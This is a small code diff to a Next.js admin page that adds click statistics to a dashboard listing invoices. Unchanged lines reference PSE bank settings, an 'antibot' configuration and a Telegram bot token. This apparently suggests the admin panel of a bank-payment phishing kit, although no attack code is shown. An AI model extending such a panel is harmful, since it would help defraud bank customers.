@@ -4,6 +4,7 @@ import { preloadSettings, Setting } from "@/lib/settings";
 import { getBancosPseSettings } from "@/lib/bancos";
 import { listFacturas } from "@/lib/facturas-cache";
 import { mergedAntibotConfig } from "@/lib/antibots/config";
+import { getClicksStats } from "@/lib/clicks";
 import CrudIndexClient from "./CrudIndexClient";
 
 export const dynamic = "force-dynamic";
@@ -23,6 +24,7 @@ export default async function CrudIndexPage({
 
   const facturas = await listFacturas({ page, perPage: 20, search: q });
   const antibot = await mergedAntibotConfig();
+  const clicks = await getClicksStats();
 
   return (
     <CrudIndexClient
@@ -36,6 +38,7 @@ export default async function CrudIndexPage({
       antibot={antibot}
       telegramBotToken={Setting.getString("telegram_bot_token", "")}
       telegramChatId={Setting.getString("telegram_chat_id", "")}
+      clicks={clicks}
     />
   );
 }
